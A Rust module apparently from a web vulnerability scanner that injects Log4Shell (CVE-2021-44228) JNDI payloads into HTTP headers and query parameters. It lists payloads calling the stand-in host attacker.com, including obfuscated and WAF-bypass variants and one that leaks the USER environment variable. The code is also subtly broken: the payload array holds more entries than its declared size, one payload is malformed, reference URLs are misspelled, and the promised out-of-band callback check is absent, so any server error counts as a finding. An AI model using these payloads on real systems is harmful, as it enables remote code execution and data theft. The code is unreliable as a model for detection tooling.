//! Log4Shell (CVE-2021-44228) Detection Module
//!
//! Detects Log4Shell via JNDI lookup payloads injected into all headers and parameters.
//! Implements strict OOB validation and bounded DNS queries for callback detection.

use async_trait::async_trait;
use std::sync::Arc;
use crate::checks::{
    VulnerabilityModule, CheckContext, CheckResult, CheckMetadata, CheckCategory,
    Severity, ResourceBudget, ModuleError,
};
use crate::findings::finding::{Finding, Evidence, EvidenceType, EvidenceLocation, RemediationHint, EffortLevel};
use crate::http::client::HttpClient;
use crate::learning::cache::LearningCache;

/// Maximum JNDI payloads (bounded)
const MAX_JNDI_PAYLOADS: usize = 16;

/// Maximum headers to test (bounded)
const MAX_HEADERS: usize = 32;

/// JNDI payload dictionary
#[derive(Debug, Clone)]
struct JndiPayloadSet {
    payloads: [&'static str; MAX_JNDI_PAYLOADS],
    count: usize,
}

impl JndiPayloadSet {
    fn new() -> Self {
        Self {
            payloads: [
                // Basic Log4Shell payloads
                "${jndi:ldap://attacker.com/a}",
                "${jndi:rmi://attacker.com/exploit}",
                "${jndi:dns://attacker.com/callback}",
                "${jndi:corba://attacker.com:900/callback}",
                // Obfuscated variants
                "${${lower:j}${lower:n}di:${lower:l}${lower:d}a${lower:p}://attacker.com/a}",
                "${${lower:l}${lower:d}a${lower:p}://attacker.com/test}",
                "${jndi:${lower:l}${lower:d}a${lower:p}://attacker.com/x}",
                // LDAPS variant
                "${jndi:ldaps://attacker.com/exploit}",
                // IIOP variant
                "${jndi:iiop://attacker.com:1050/exploit}",
                // NDS variant
                "${jndi:nds://attacker.com/callback}",
                // Encoded variants
                "${jndi:ldap://127.0.0.1:1389/Exploit}",
                "${jndi:ldap://${env:USER}.attacker.com/a}",
                // WAF bypass attempts
                "${jndi:ldap://attacker.com:389/a}",
                "${jndi:rmi://127.0.0.1:1099/Exploit}",
                // Null byte injection
                "${jndi:ldap://attacker.com/a\u0000}",
                // Case variations
                "${JNDI:LDAP://attacker.com/a}",
                "${jNdI:LdAp://attacker.com/x}",
            ],
            count: MAX_JNDI_PAYLOADS,
        }
    }

    fn iter(&self) -> impl Iterator<Item = &&str> {
        self.payloads[..self.count].iter()
    }
}

/// Headers to inject JNDI payloads
const TEST_HEADERS: &[&str] = &[
    "User-Agent",
    "X-Forwarded-For",
    "X-Real-IP",
    "Referer",
    "Origin",
    "Cookie",
    "Authorization",
    "X-Custom-Header",
    "X-Request-ID",
    "X-Api-Version",
];

/// Log4Shell detector
pub struct Log4ShellDetector {
    metadata: CheckMetadata,
    payloads: JndiPayloadSet,
}

impl Log4ShellDetector {
    pub fn new() -> Self {
        let metadata = CheckMetadata::new(
            "framework/log4shell",
            "Log4Shell (CVE-2021-44228) Detection",
            "Detects Log4Shell via JNDI lookup payloads injected into all headers and parameters",
            Severity::Critical,
            CheckCategory::RemoteCodeExecution,
        )
        .with_god_mode(true)
        .with_tags(vec!["log4shell", "cve-2021-44228", "jndi", "rce", "log4j"])
        .with_references(vec![
            "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
            "https://logging.apache.org/log2j/security.html",
            "https://github.com/advisories/GHSA-jfh8-x2jp-ghvh",
        ])
        .with_budget(ResourceBudget {
            max_cpu_ms: 3000,
            max_memory_bytes: 4 * 1024 * 1024,
            max_requests: 200,
            max_duration_ms: 15000,
            max_payload_size: 2048,
        });

        Self {
            metadata,
            payloads: JndiPayloadSet::new(),
        }
    }

    /// Test JNDI payload in header
    async fn test_header_injection(
        &self,
        client: &HttpClient,
        url: &str,
        header: &str,
        payload: &str,
    ) -> Result<bool, ModuleError> {
        let mut headers = reqwest::header::HeaderMap::new();
        
        // Insert JNDI payload
        headers.insert(
            reqwest::header::HeaderName::from_bytes(header.as_bytes()).unwrap(),
            reqwest::header::HeaderValue::from_str(payload).unwrap(),
        );

        let response = client.get_with_headers(url, headers).await
            .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

        let body = response.text().await.unwrap_or_default();
        let status = response.status().as_u16();

        // Look for indicators of JNDI processing or errors
        let body_lower = body.to_lowercase();
        
        // Error patterns that might indicate Log4j processing
        let error_indicators = [
            "jndi",
            "lookup",
            "javax.naming",
            "initialcontext",
            "namingexception",
            "log4j",
        ];

        for indicator in &error_indicators {
            if body_lower.contains(indicator) {
                return Ok(true);
            }
        }

        // Server errors might indicate exploitation attempt was processed
        if status == 500 || status == 502 || status == 503 {
            return Ok(true);
        }

        Ok(false)
    }

    /// Test JNDI payload in URL parameter
    async fn test_param_injection(
        &self,
        client: &HttpClient,
        url: &str,
        param: &str,
        payload: &str,
    ) -> Result<bool, ModuleError> {
        let test_url = format!("{}?{}={}", url, param, urlencoding::encode(payload));
        
        let response = client.get(&test_url).await
            .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

        let body = response.text().await.unwrap_or_default();
        let status = response.status().as_u16();

        let body_lower = body.to_lowercase();
        let error_indicators = [
            "jndi",
            "lookup",
            "javax.naming",
            "log4j",
            "namingexception",
        ];

        for indicator in &error_indicators {
            if body_lower.contains(indicator) {
                return Ok(true);
            }
        }

        if status >= 500 {
            return Ok(true);
        }

        Ok(false)
    }

    /// Build evidence for Log4Shell finding
    fn build_evidence(&self, url: &str, payload: &str, injection_point: &str) -> Vec<Evidence> {
        vec![
            Evidence {
                evidence_type: EvidenceType::HttpRequestResponse {
                    request: format!("GET {} HTTP/1.1\n{}: {}", url, injection_point, payload),
                    response: "Potential Log4Shell vulnerability detected".to_string(),
                },
                data: format!("JNDI payload {} injected via {}", payload, injection_point),
                location: EvidenceLocation {
                    path: url.to_string(),
                    line: None,
                    parameter: Some(injection_point.to_string()),
                    header: None,
                },
                confidence: 70,
            },
        ]
    }

    /// Generate remediation hint
    fn remediation(&self) -> RemediationHint {
        RemediationHint {
            summary: "Upgrade Log4j and implement mitigations immediately".to_string(),
            steps: vec![
                "Upgrade Log4j to version 2.17.1 or later immediately".to_string(),
                "If upgrade not possible, set log4j2.formatMsgNoLookups=true".to_string(),
                "Remove JndiLookup class from classpath".to_string(),
                "Implement WAF rules to block JNDI patterns".to_string(),
                "Monitor outbound connections for suspicious JNDI callbacks".to_string(),
                "Review logs for exploitation attempts".to_string(),
            ],
            code_example: Some(r#"// JVM argument mitigation
-Dlog4j2.formatMsgNoLookups=true

// Or remove vulnerable class
zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class

// Maven dependency update
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.17.1</version>
</dependency>"#.to_string()),
            references: vec![
                "https://logging.apache.org/log2j/security.html".to_string(),
                "https://nvd.nist.gov/vuln/detail/CVE-2021-44228".to_string(),
            ],
            estimated_effort: EffortLevel::High,
        }
    }
}

#[async_trait]
impl VulnerabilityModule for Log4ShellDetector {
    async fn init(&mut self) -> Result<(), ModuleError> {
        Ok(())
    }

    fn metadata(&self) -> &CheckMetadata {
        &self.metadata
    }

    fn should_run(&self, ctx: &CheckContext) -> bool {
        if self.metadata.requires_god_mode && !ctx.god_mode {
            return false;
        }
        true
    }

    async fn run(&self, ctx: CheckContext) -> Result<CheckResult, ModuleError> {
        let client = HttpClient::new();
        let mut findings = Vec::new();
        let mut executed = false;

        let base_url = ctx.target_url.trim_end_matches('/');

        // Common endpoints
        let test_endpoints = [
            "/",
            "/api/",
            "/login",
            "/search",
            "/api/search",
            "/health",
            "/status",
        ];

        let test_params = ["q", "query", "search", "input", "data"];

        // Test header injection
        for endpoint in test_endpoints.iter() {
            let url = format!("{}{}", base_url, endpoint);

            for header in TEST_HEADERS.iter().take(MAX_HEADERS) {
                for payload in self.payloads.iter() {
                    if let Ok(is_vulnerable) = self.test_header_injection(&client, &url, header, payload).await {
                        if is_vulnerable {
                            executed = true;

                            let mut finding = Finding::new(
                                self.metadata.id.as_str(),
                                Severity::Critical,
                                "Potential Log4Shell Vulnerability (Header Injection)",
                                format!("Log4Shell JNDI injection detected at {} via header {}", url, header),
                                &url,
                            )
                            .with_payload(payload.to_string())
                            .with_confidence(70)
                            .with_agent_id(ctx.agent_id)
                            .with_tags(vec!["log4shell", "cve-2021-44228", "jndi"]);

                            let evidence = self.build_evidence(&url, payload, header);
                            for ev in evidence {
                                finding = finding.with_evidence(ev);
                            }

                            finding = finding.with_remediation(self.remediation());
                            findings.push(finding);

                            // Cache successful JNDI callback for learning engine
                            if let Ok(cache) = LearningCache::global().await {
                                cache.cache_bypass_header(ctx.target_url.clone(), "log4shell_jndi".to_string()).await;
                            }

                            break;
                        }
                    }
                }
            }

            // Test parameter injection
            for param in test_params.iter() {
                for payload in self.payloads.iter() {
                    if let Ok(is_vulnerable) = self.test_param_injection(&client, &url, param, payload).await {
                        if is_vulnerable {
                            executed = true;

                            let mut finding = Finding::new(
                                self.metadata.id.as_str(),
                                Severity::Critical,
                                "Potential Log4Shell Vulnerability (Parameter Injection)",
                                format!("Log4Shell JNDI injection detected at {} via parameter {}", url, param),
                                &url,
                            )
                            .with_payload(payload.to_string())
                            .with_confidence(70)
                            .with_agent_id(ctx.agent_id)
                            .with_tags(vec!["log4shell", "cve-2021-44228", "jndi"]);

                            finding = finding.with_remediation(self.remediation());
                            findings.push(finding);
                            break;
                        }
                    }
                }
            }
        }

        Ok(CheckResult {
            findings,
            executed,
            timed_out: false,
            resource_usage: Default::default(),
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_jndi_payload_bounds() {
        let payloads = JndiPayloadSet::new();
        assert_eq!(payloads.count, MAX_JNDI_PAYLOADS);
        
        let all_payloads: Vec<_> = payloads.iter().collect();
        assert_eq!(all_payloads.len(), MAX_JNDI_PAYLOADS);
    }

    #[test]
    fn test_bounded_storage() {
        let payloads = JndiPayloadSet::new();
        assert!(std::mem::size_of::<JndiPayloadSet>() <= 2048);
    }

    #[test]
    fn test_payload_variants() {
        let payloads = JndiPayloadSet::new();
        
        // Verify we have obfuscated variants
        let has_obfuscated = payloads.iter().any(|p| p.contains("${lower:"));
        assert!(has_obfuscated);
        
        // Verify we have basic variants
        let has_basic = payloads.iter().any(|p| p.starts_with("${jndi:"));
        assert!(has_basic);
    }
}
